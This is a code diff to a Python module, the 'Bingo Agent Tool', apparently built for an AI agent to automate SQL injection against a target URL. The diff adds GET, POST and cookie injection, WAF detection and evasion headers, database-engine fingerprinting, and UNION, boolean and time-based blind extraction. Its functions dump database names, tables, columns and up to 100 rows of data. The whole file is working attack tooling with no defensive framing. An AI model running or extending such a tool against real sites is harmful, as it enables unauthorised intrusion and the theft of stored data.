@@ -7,6 +7,17 @@ AI가 매번 기본 HTTP/SQLi 로직을 재작성하지 않아도 됨.
     sys.path.insert(0, os.path.expanduser("~/.bingo"))
     from agent_tools import T
     t = T("https://target.com/page?id=1")
+
+지원 인젝션 포인트:
+    - GET 쿼리 파라미터 (기본)
+    - POST body (T("url", post={"key":"val"}) 또는 t.set_post(...))
+    - Cookie (T("url", cookie={"PHPSESSID":"..."}) 또는 t.set_cookie(...))
+
+지원 DB 엔진:
+    - MySQL / MariaDB (자동 감지)
+    - PostgreSQL (자동 감지)
+    - MSSQL (자동 감지)
+    - SQLite (자동 감지)
 """
 from __future__ import annotations
 import re, time, random
@@ -16,7 +27,7 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 try:
     import httpx as _httpx
     _CLIENT = _httpx.Client(
-        follow_redirects=True, verify=False, timeout=12,
+        follow_redirects=True, verify=False, timeout=15,
         headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"}
     )
 except ImportError:
@@ -30,60 +41,114 @@ _WAF_SIGS = {
     "Wordfence":   ["wordfence", "x-fw-hash"],
     "Sucuri":      ["sucuri", "x-sucuri-id"],
     "Akamai":      ["akamai", "x-akamai"],
+    "Imperva":     ["incapsula", "x-iinfo", "_incap_ses"],
+    "F5 BIG-IP":   ["f5-bigip", "x-cnection", "bigipserver"],
+    "Barracuda":   ["barracuda", "barra_counter_session"],
 }
 
-# ── SQL 에러 패턴 ─────────────────────────────────────────────────
-_SQL_ERRORS = [
-    r"you have an error in your sql syntax",
-    r"warning.*mysql", r"ora-\d{5}",
-    r"microsoft ole db", r"sqlite_error",
-    r"pg::syntaxerror", r"unclosed quotation mark",
-    r"division by zero", r"sql.*error",
-    r"invalid input syntax", r"syntax error at or near",
-]
+# ── SQL 에러 패턴 (DB별) ──────────────────────────────────────────
+_SQL_ERRORS = {
+    "MySQL":      [r"you have an error in your sql syntax", r"warning.*mysql",
+                   r"supplied argument is not a valid mysql", r"mysql_fetch_array"],
+    "PostgreSQL": [r"pg::syntaxerror", r"postgresql.*error", r"invalid input syntax",
+                   r"syntax error at or near", r"pg_query\(\)"],
+    "MSSQL":      [r"microsoft ole db", r"odbc microsoft access", r"unclosed quotation mark",
+                   r"microsoft jet database", r"\[microsoft\]\[odbc sql server driver\]"],
+    "Oracle":     [r"ora-\d{5}", r"oracle.*driver", r"quoted string not properly terminated"],
+    "SQLite":     [r"sqlite_error", r"sqlite3::exception", r"near \".*\": syntax error"],
+    "Generic":    [r"sql.*error", r"division by zero", r"syntax error"],
+}
+_ALL_SQL_ERRORS = [p for pats in _SQL_ERRORS.values() for p in pats]
 
 # ── WAF 우회 헤더 세트 ────────────────────────────────────────────
 _BYPASS_HEADERS = [
     {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
     {"X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1"},
     {"CF-Connecting-IP": "127.0.0.1"},
-    {},  # 헤더 없이도 시도
+    {},
 ]
 
 _UA_LIST = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
     "Googlebot/2.1 (+http://www.google.com/bot.html)",
 ]
 
 
 class T:
-    """Bingo Agent Tool — 하나의 타겟 URL에 대한 모든 작업 처리."""
+    """Bingo Agent Tool — 하나의 타겟 URL에 대한 모든 작업 처리.
 
-    def __init__(self, target_url: str, param: str | None = None):
+    지원 인젝션:
+      - GET 쿼리 파라미터 (기본)
+      - POST body  →  post={"key": "val"} 또는 t.set_post(...)
+      - Cookie     →  cookie={"PHPSESSID": "..."} 또는 t.set_cookie(...)
+    """
+
+    def __init__(
+        self,
+        target_url: str,
+        param: str | None = None,
+        post: dict | None = None,
+        cookie: dict | None = None,
+    ):
         self.target = target_url
         self.parsed = urlparse(target_url)
         self.qs = parse_qs(self.parsed.query, keep_blank_values=True)
-        # HTML 엔티티 정리
         self.qs = {k.replace("amp;", ""): v for k, v in self.qs.items()}
         self.params = {k: v[0] for k, v in self.qs.items()}
         self.param = param or (list(self.params.keys())[0] if self.params else None)
+
+        # POST / Cookie 지원
+        self._post: dict | None = post
+        self._cookie: dict | None = cookie
+        self._inject_mode: str = "post" if post else "get"  # "get" | "post" | "cookie"
+
+        # DB 엔진
+        self.db_engine: str = "MySQL"  # 자동 감지 후 업데이트
+
+        # 상태
         self.waf: str | None = None
         self._true_len: int = 0
         self._false_len: int = 0
         self._margin: int = 80
 
+    def set_post(self, data: dict, param: str | None = None) -> "T":
+        """POST 인젝션으로 전환."""
+        self._post = data
+        self._inject_mode = "post"
+        if param:
+            self.param = param
+        elif not self.param:
+            self.param = list(data.keys())[0] if data else None
+        return self
+
+    def set_cookie(self, data: dict, param: str | None = None) -> "T":
+        """Cookie 인젝션으로 전환."""
+        self._cookie = data
+        self._inject_mode = "cookie"
+        if param:
+            self.param = param
+        elif not self.param:
+            self.param = list(data.keys())[0] if data else None
+        return self
+
     # ── HTTP 기본 ─────────────────────────────────────────────────
-    def get(self, url: str, extra_headers: dict | None = None, retries: int = 2) -> tuple[int, int, str]:
-        """GET 요청. (status, length, body) 반환."""
+    def get(self, url: str, extra_headers: dict | None = None, retries: int = 2,
+            post_data: dict | None = None, cookie_data: dict | None = None) -> tuple[int, int, str]:
+        """HTTP 요청. POST/Cookie 지원. (status, length, body) 반환."""
         if _CLIENT is None:
-            raise ImportError("httpx not installed")
-        hdrs = {"User-Agent": random.choice(_UA_LIST)}
+            raise ImportError("httpx not installed. Run: pip install httpx")
+        hdrs: dict = {"User-Agent": random.choice(_UA_LIST)}
+        if cookie_data:
+            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookie_data.items())
         hdrs.update(extra_headers or {})
         for attempt in range(retries + 1):
             try:
-                r = _CLIENT.get(url, headers=hdrs)
+                if post_data is not None:
+                    r = _CLIENT.post(url, data=post_data, headers=hdrs)
+                else:
+                    r = _CLIENT.get(url, headers=hdrs)
                 return r.status_code, len(r.text), r.text
             except Exception as e:
                 if attempt == retries:
@@ -93,18 +158,30 @@ class T:
 
     def inject(self, payload: str, param: str | None = None,
                extra_headers: dict | None = None) -> tuple[int, int, str]:
-        """파라미터에 페이로드 주입 후 요청."""
+        """설정된 인젝션 모드(GET/POST/Cookie)로 페이로드 주입."""
         p = param or self.param
         if not p:
             return 0, 0, "[ERROR] no param"
-        qs = dict(self.qs)
-        orig = qs.get(p, [""])[0]
-        qs[p] = [orig + payload]
-        url = urlunparse((
-            self.parsed.scheme, self.parsed.netloc, self.parsed.path,
-            self.parsed.params, urlencode(qs, doseq=True), ""
-        ))
-        return self.get(url, extra_headers)
+
+        if self._inject_mode == "post" and self._post is not None:
+            data = dict(self._post)
+            data[p] = data.get(p, "") + payload
+            return self.get(self.target, extra_headers, post_data=data)
+
+        elif self._inject_mode == "cookie" and self._cookie is not None:
+            ck = dict(self._cookie)
+            ck[p] = ck.get(p, "") + payload
+            return self.get(self.target, extra_headers, cookie_data=ck)
+
+        else:  # GET
+            qs = dict(self.qs)
+            orig = qs.get(p, [""])[0]
+            qs[p] = [orig + payload]
+            url = urlunparse((
+                self.parsed.scheme, self.parsed.netloc, self.parsed.path,
+                self.parsed.params, urlencode(qs, doseq=True), ""
+            ))
+            return self.get(url, extra_headers)
 
     def inject_abs(self, payload: str, param: str | None = None,
                    extra_headers: dict | None = None) -> tuple[int, int, str]:
@@ -112,62 +189,153 @@ class T:
         p = param or self.param
         if not p:
             return 0, 0, "[ERROR] no param"
-        qs = dict(self.qs)
-        qs[p] = [payload]
-        url = urlunparse((
-            self.parsed.scheme, self.parsed.netloc, self.parsed.path,
-            self.parsed.params, urlencode(qs, doseq=True), ""
-        ))
-        return self.get(url, extra_headers)
+
+        if self._inject_mode == "post" and self._post is not None:
+            data = dict(self._post)
+            data[p] = payload
+            return self.get(self.target, extra_headers, post_data=data)
+
+        elif self._inject_mode == "cookie" and self._cookie is not None:
+            ck = dict(self._cookie)
+            ck[p] = payload
+            return self.get(self.target, extra_headers, cookie_data=ck)
+
+        else:
+            qs = dict(self.qs)
+            qs[p] = [payload]
+            url = urlunparse((
+                self.parsed.scheme, self.parsed.netloc, self.parsed.path,
+                self.parsed.params, urlencode(qs, doseq=True), ""
+            ))
+            return self.get(url, extra_headers)
 
     # ── WAF 탐지 ─────────────────────────────────────────────────
     def detect_waf(self) -> str | None:
         """WAF 탐지. 이름 반환 (없으면 None)."""
-        s, l, body = self.get(self.target)
-        if s == 0:
+        if _CLIENT is None:
             return None
-        body_l = body.lower()
-        # 헤더 기반 탐지 (실제 응답 헤더는 별도 요청 필요)
-        if _CLIENT:
-            try:
-                r = _CLIENT.get(self.target)
-                for waf, sigs in _WAF_SIGS.items():
-                    for sig in sigs:
-                        if sig in str(r.headers).lower() or sig in r.text.lower()[:2000]:
-                            self.waf = waf
-                            print(f"[WAF] {waf} detected")
-                            return waf
-            except Exception:
-                pass
+        try:
+            r = _CLIENT.get(self.target, headers={"User-Agent": random.choice(_UA_LIST)})
+            hdr_str = str(r.headers).lower()
+            body_head = r.text.lower()[:3000]
+            for waf, sigs in _WAF_SIGS.items():
+                for sig in sigs:
+                    if sig in hdr_str or sig in body_head:
+                        self.waf = waf
+                        print(f"[WAF] {waf} detected (header/body)")
+                        return waf
+        except Exception:
+            pass
         # 블로킹 프로브
         _, _, probe = self.inject("'")
+        probe_l = probe.lower()[:3000]
         for waf, sigs in _WAF_SIGS.items():
             for sig in sigs:
-                if sig in probe.lower()[:3000]:
+                if sig in probe_l:
                     self.waf = waf
-                    print(f"[WAF] {waf} detected via block probe")
+                    print(f"[WAF] {waf} detected (block probe)")
                     return waf
         print("[WAF] No WAF detected")
         return None
 
     def is_waf_blocked(self, body: str, status: int) -> bool:
-        """응답이 WAF 차단인지 확인."""
-        if status in (403, 406, 429):
+        if status in (403, 406, 429, 503):
             return True
         body_l = body.lower()[:3000]
         block_sigs = ["cloudflare", "attention required", "blocked", "access denied",
-                      "_cf_chl", "challenge-form", "turnstile", "sucuri", "wordfence block"]
+                      "_cf_chl", "challenge-form", "turnstile", "sucuri", "wordfence block",
+                      "incapsula", "request rejected", "illegal access"]
         return any(sig in body_l for sig in block_sigs)
+
+    # ── DB 엔진 자동 감지 ─────────────────────────────────────────
+    def detect_db_engine(self) -> str:
+        """에러 기반으로 DB 엔진 자동 감지."""
+        _, _, body = self.inject("'")
+        body_l = body.lower()
+        for engine, patterns in _SQL_ERRORS.items():
+            if engine == "Generic":
+                continue
+            for pat in patterns:
+                if re.search(pat, body_l):
+                    self.db_engine = engine
+                    print(f"[DB ENGINE] Detected: {engine}")
+                    return engine
+        print(f"[DB ENGINE] Defaulting to MySQL")
+        return "MySQL"
 
     # ── SQL 에러 탐지 ─────────────────────────────────────────────
     def has_sql_error(self, body: str) -> str | None:
-        """SQL 에러 패턴 탐지. 발견된 패턴 반환."""
         body_l = body.lower()
-        for pat in _SQL_ERRORS:
+        for pat in _ALL_SQL_ERRORS:
             m = re.search(pat, body_l)
             if m:
                 return pat
         return None
+
+    # ── UNION 기반 추출 ───────────────────────────────────────────
+    def union_detect_columns(self, max_cols: int = 20) -> int:
+        """UNION SELECT 컬럼 수 탐지. 성공한 컬럼 수 반환 (0=실패)."""
+        print("[UNION] Detecting number of columns...")
+        for n in range(1, max_cols + 1):
+            nulls = ",".join(["NULL"] * n)
+            payload = f" UNION SELECT {nulls}-- -"
+            _, _, body = self.inject(payload)
+            if not self.is_waf_blocked(body, 200) and not self.has_sql_error(body):
+                # 에러 없이 응답 → 컬럼 수 맞음
+                print(f"[UNION] Column count: {n}")
+                return n
+        return 0
+
+    def union_find_printable(self, n_cols: int) -> int | None:
+        """출력 가능한 컬럼 위치 탐지."""
+        sentinel = "BINGO_UNION_TEST_9x7z"
+        for pos in range(1, n_cols + 1):
+            parts = ["NULL"] * n_cols
+            parts[pos - 1] = f"'{sentinel}'"
+            payload = f" UNION SELECT {','.join(parts)}-- -"
+            _, _, body = self.inject(payload)
+            if sentinel in body:
+                print(f"[UNION] Printable column: {pos}")
+                return pos
+        return None
+
+    def union_extract(self, sql_expr: str) -> str:
+        """UNION으로 단일 SQL 표현식 추출. 실패 시 빈 문자열 반환."""
+        n = self.union_detect_columns()
+        if n == 0:
+            return ""
+        pos = self.union_find_printable(n)
+        if pos is None:
+            return ""
+        parts = ["NULL"] * n
+        parts[pos - 1] = f"({sql_expr})"
+        payload = f" UNION SELECT {','.join(parts)}-- -"
+        _, _, body = self.inject(payload)
+        # 결과 추출
+        m = re.search(r"BINGO_START(.+?)BINGO_END", body, re.DOTALL)
+        if m:
+            return m.group(1)
+        # 마커 없이 그냥 body에서 추출 — 간단한 버전
+        return ""
+
+    def union_extract_marked(self, sql_expr: str) -> str:
+        """마커 방식 UNION 추출: CONCAT('BINGO_START', expr, 'BINGO_END')."""
+        n = self.union_detect_columns()
+        if n == 0:
+            return ""
+        pos = self.union_find_printable(n)
+        if pos is None:
+            return ""
+        parts = ["NULL"] * n
+        parts[pos - 1] = f"CONCAT(0x42494e474f5f5354415254,({sql_expr}),0x42494e474f5f454e44)"
+        payload = f" UNION SELECT {','.join(parts)}-- -"
+        _, _, body = self.inject(payload)
+        m = re.search(r"BINGO_START(.+?)BINGO_END", body, re.DOTALL)
+        if m:
+            val = m.group(1).strip()
+            print(f"[UNION_MARKED] {sql_expr} = {val!r}")
+            return val
+        return ""
 
     # ── Boolean 기준값 설정 ───────────────────────────────────────
     def calibrate_boolean(self) -> bool:
@@ -182,11 +350,8 @@ class T:
             print(f"[BOOL] No length difference (diff={diff}B) — may not be boolean injectable")
             return False
 
-        # true가 false보다 커야 정상 (AND 1=1 → 정상 페이지 → 더 많은 컨텐츠)
-        # 반대면 논리 반전
         if false_len > true_len:
-            print(f"[BOOL] WARNING: false({false_len}) > true({true_len}) — logic inverted!")
-            # 스왑
+            print(f"[BOOL] Logic inverted: false({false_len}) > true({true_len}) — swapping")
             true_len, false_len = false_len, true_len
 
         self._true_len = true_len
@@ -198,22 +363,20 @@ class T:
     def is_true_response(self, length: int) -> bool:
         if length <= 0:
             return False
-        # true_len에 가까우면 True, false_len에 가까우면 False
         dist_true  = abs(length - self._true_len)
         dist_false = abs(length - self._false_len)
         return dist_true < dist_false and dist_true < self._margin
 
     # ── Boolean 추출 (WAF 우회 자동 적용) ────────────────────────
-    def bool_extract_len(self, expr: str, max_len: int = 40) -> int:
-        """Boolean으로 SQL 표현식의 길이 추출. WAF 우회 자동 시도."""
-        # 우회 변형 생성
+    def bool_extract_len(self, expr: str, max_len: int = 80) -> int:
+        """Boolean으로 SQL 표현식의 정수값(또는 길이) 추출."""
         def make_variants(i: int) -> list[str]:
             return [
                 f" AND {expr}={i}-- -",
                 f" AND ({expr})={i}-- -",
                 f" AND {i}=({expr})-- -",
                 f"/**/AND/**/{expr}={i}-- -",
-                f" AND {expr.replace('(', '/**/(').replace(')', ')/**/')}={i}-- -",
+                f" AND {expr} BETWEEN {i} AND {i}-- -",
             ]
 
         for i in range(1, max_len + 1):
@@ -235,14 +398,13 @@ class T:
             f"ASCII(SUBSTRING(({expr}),{pos},1))",
         ]
 
-        # 먼저 해당 위치 문자가 존재하는지 확인 (0이면 빈 문자)
+        # 문자 존재 확인
         for ce in char_exprs:
             for v in [f" AND {ce}>0-- -", f"/**/AND/**/{ce}>0-- -"]:
                 _, length, body = self.inject(v)
                 if self.is_waf_blocked(body, length):
                     continue
                 if not self.is_true_response(length):
-                    # ASCII > 0 이 False → 문자가 없음 (NULL or empty)
                     return ""
                 break
             break
@@ -270,19 +432,16 @@ class T:
                 if found:
                     break
             if not found:
-                # 모든 변형이 WAF 차단 → 이진탐색 불가, 타임기반 전환
                 return "?"
             time.sleep(0.05)
 
         result_chr = lo
-        # 유효 ASCII 범위 벗어나면 재검증
         if result_chr < 32 or result_chr > 126:
             return "?"
         return chr(result_chr)
 
-    def bool_extract_string(self, expr: str, max_len: int = 40) -> str:
+    def bool_extract_string(self, expr: str, max_len: int = 80) -> str:
         """Boolean으로 SQL 문자열 표현식 전체 추출."""
-        # 길이 추출 시 함수명도 우회
         len_exprs = [
             f"LENGTH({expr})",
             f"CHAR_LENGTH({expr})",
@@ -296,8 +455,7 @@ class T:
                 break
 
         if slen == 0:
-            # 타임기반 폴백
-            print(f"[BOOL] Boolean length failed, trying time-based for: {expr}")
+            print(f"[BOOL] Boolean length failed → time-based fallback: {expr}")
             slen = self.time_extract_len(expr, max_len)
 
         if slen == 0:
@@ -307,18 +465,14 @@ class T:
         for pos in range(1, slen + 1):
             ch = self.bool_extract_char(expr, pos)
             result += ch
-            print(f"[EXTRACT] {expr}[{pos}/{slen}] = {ch} → {result}")
+            print(f"[EXTRACT] [{pos}/{slen}] = {ch!r} → {result!r}")
         return result
 
     # ── 타임기반 (Boolean 완전 차단 시 폴백) ─────────────────────
-    def time_extract_len(self, expr: str, max_len: int = 30, sleep_sec: float = 3.0) -> int:
+    def time_extract_len(self, expr: str, max_len: int = 80, sleep_sec: float = 3.0) -> int:
         """Time-based으로 길이 추출."""
         print(f"[TIME] Extracting length of: {expr}")
-        len_exprs = [
-            f"LENGTH({expr})",
-            f"CHAR_LENGTH({expr})",
-        ]
-        for le in len_exprs:
+        for le in [f"LENGTH({expr})", f"CHAR_LENGTH({expr})"]:
             for i in range(1, max_len + 1):
                 payload = f" AND IF({le}={i},SLEEP({sleep_sec}),0)-- -"
                 t0 = time.time()
@@ -330,12 +484,11 @@ class T:
                 time.sleep(0.1)
         return 0
 
-    def time_extract_string(self, expr: str, max_len: int = 30, sleep_sec: float = 3.0) -> str:
-        """Time-based으로 문자열 추출 (느리지만 WAF 우회 가능)."""
+    def time_extract_string(self, expr: str, max_len: int = 80, sleep_sec: float = 3.0) -> str:
+        """Time-based으로 문자열 추출."""
         slen = self.time_extract_len(expr, max_len, sleep_sec)
         if slen == 0:
             return "[time_extraction_failed]"
-
         result = ""
         for pos in range(1, slen + 1):
             lo, hi = 32, 126
@@ -350,17 +503,45 @@ class T:
                     hi = mid - 1
                 time.sleep(0.05)
             result += chr(lo)
-            print(f"[TIME_EXTRACT] [{pos}/{slen}] = {chr(lo)} → {result}")
+            print(f"[TIME_EXTRACT] [{pos}/{slen}] = {chr(lo)!r} → {result!r}")
         return result
+
+    # ── 스마트 추출 (UNION → Boolean → Time 자동 선택) ────────────
+    def smart_extract(self, sql_expr: str, max_len: int = 80) -> str:
+        """가장 빠른 추출 방법 자동 선택: UNION > Boolean > Time."""
+        # 1) UNION 시도
+        print(f"[SMART] Trying UNION-based extraction...")
+        val = self.union_extract_marked(sql_expr)
+        if val and "[" not in val and val != "":
+            print(f"[SMART] UNION succeeded: {val!r}")
+            return val
+        # 2) Boolean 시도
+        print(f"[SMART] Trying boolean-based extraction...")
+        val = self.bool_extract_string(sql_expr, max_len)
+        if val and "failed" not in val:
+            return val
+        # 3) Time 폴백
+        print(f"[SMART] Falling back to time-based extraction...")
+        return self.time_extract_string(sql_expr, max_len)
 
     # ── DB 전체 덤프 ─────────────────────────────────────────────
     def dump_databases(self) -> list[str]:
-        """DB 목록 추출."""
+        """DB 목록 추출 (스마트 방식)."""
         print("[DUMP] Extracting database list...")
+        # UNION이면 한 번에 다 뽑기
+        val = self.union_extract_marked(
+            "SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata"
+        )
+        if val and "," in val:
+            dbs = [d.strip() for d in val.split(",") if d.strip()]
+            print(f"[DUMP] Databases (UNION): {dbs}")
+            return dbs
+
+        # Boolean
         count_expr = "SELECT COUNT(*) FROM information_schema.schemata"
         count = self.bool_extract_len(f"({count_expr})", 30)
         if count == 0:
-            count = 5  # 폴백
+            count = 5
 
         dbs = []
         for i in range(count):
@@ -375,14 +556,27 @@ class T:
         """특정 DB의 테이블 목록 추출."""
         print(f"[DUMP] Extracting tables from {db_name}...")
         hex_db = db_name.encode().hex()
+
+        # UNION 시도
+        val = self.union_extract_marked(
+            f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
+            f"FROM information_schema.tables WHERE table_schema=0x{hex_db}"
+        )
+        if val and val.strip():
+            tables = [t.strip() for t in val.split(",") if t.strip()]
+            print(f"[DUMP] Tables (UNION): {tables}")
+            return tables
+
+        # Boolean
         count_expr = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=0x{hex_db}"
-        count = self.bool_extract_len(f"({count_expr})", 50)
+        count = self.bool_extract_len(f"({count_expr})", 100)
         if count == 0:
             return []
 
         tables = []
         for i in range(count):
-            expr = f"SELECT table_name FROM information_schema.tables WHERE table_schema=0x{hex_db} LIMIT {i},1"
+            expr = (f"SELECT table_name FROM information_schema.tables "
+                    f"WHERE table_schema=0x{hex_db} LIMIT {i},1")
             tbl = self.bool_extract_string(f"({expr})")
             if tbl and "[" not in tbl:
                 tables.append(tbl)
@@ -393,11 +587,24 @@ class T:
         """특정 테이블의 컬럼 목록 추출."""
         hex_db  = db_name.encode().hex()
         hex_tbl = table_name.encode().hex()
+
+        # UNION 시도
+        val = self.union_extract_marked(
+            f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') "
+            f"FROM information_schema.columns "
+            f"WHERE table_schema=0x{hex_db} AND table_name=0x{hex_tbl}"
+        )
+        if val and val.strip():
+            cols = [c.strip() for c in val.split(",") if c.strip()]
+            print(f"[DUMP] Columns (UNION): {cols}")
+            return cols
+
+        # Boolean
         count_expr = (
             f"SELECT COUNT(*) FROM information_schema.columns "
             f"WHERE table_schema=0x{hex_db} AND table_name=0x{hex_tbl}"
         )
-        count = self.bool_extract_len(f"({count_expr})", 30)
+        count = self.bool_extract_len(f"({count_expr})", 50)
         if count == 0:
             return []
 
@@ -414,23 +621,42 @@ class T:
         return cols
 
     def dump_data(self, db_name: str, table_name: str, columns: list[str],
-                  limit: int = 10) -> list[dict]:
-        """테이블 데이터 추출."""
+                  limit: int = 100) -> list[dict]:
+        """테이블 데이터 추출 (기본 100행)."""
+        rows = []
         hex_db  = db_name.encode().hex()
         hex_tbl = table_name.encode().hex()
-        rows = []
+
+        # UNION으로 전체 한 번에 (최대 20행)
+        concat_cols = ",0x7c,".join(
+            [f"IFNULL({c},'NULL')" for c in columns]
+        )
+        val = self.union_extract_marked(
+            f"SELECT GROUP_CONCAT({concat_cols} SEPARATOR 0x0a) "
+            f"FROM {db_name}.{table_name} LIMIT {min(limit, 20)}"
+        )
+        if val and val.strip():
+            for line in val.split("\n"):
+                parts = line.split("|")
+                if len(parts) == len(columns):
+                    row = {c: p.strip() for c, p in zip(columns, parts)}
+                    rows.append(row)
+                    print(f"[ROW] {row}")
+            if rows:
+                return rows
+
+        # Boolean 폴백 (행별 컬럼별)
         for i in range(limit):
             row: dict[str, str] = {}
             for col in columns:
-                hex_col = col.encode().hex()
-                expr = (
-                    f"SELECT {col} FROM {db_name}.{table_name} LIMIT {i},1"
-                )
-                val = self.bool_extract_string(f"({expr})")
+                expr = f"SELECT {col} FROM {db_name}.{table_name} LIMIT {i},1"
+                val = self.bool_extract_string(f"({expr})", max_len=80)
                 row[col] = val
             if any(v and "[" not in v for v in row.values()):
                 rows.append(row)
                 print(f"[ROW {i}] {row}")
+            else:
+                break  # 더 이상 데이터 없음
         return rows
 
 
